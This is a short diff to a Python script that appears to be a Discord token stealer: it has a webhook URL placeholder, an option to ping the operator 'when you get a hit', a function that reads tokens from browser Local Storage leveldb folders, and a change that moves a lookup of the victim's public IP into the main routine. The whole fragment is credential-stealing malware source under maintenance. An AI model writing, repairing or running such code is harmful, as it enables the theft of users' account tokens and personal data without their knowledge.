@@ -11,9 +11,6 @@ WEBHOOK_URL = 'WEBHOOK HERE'
 # mentions you when you get a hit
 PING_ME = False
 
-def get_ip():
-    ip_api = requests.get('https://ifconfig.co/json')
-    ip_data = ip_api.text
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -45,7 +42,10 @@ def main():
     }
 
     message = '@everyone' if PING_ME else ''
-
+    
+    ip_api = requests.get('https://ifconfig.co/json')
+    ip_data = ip_api.text
+    
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
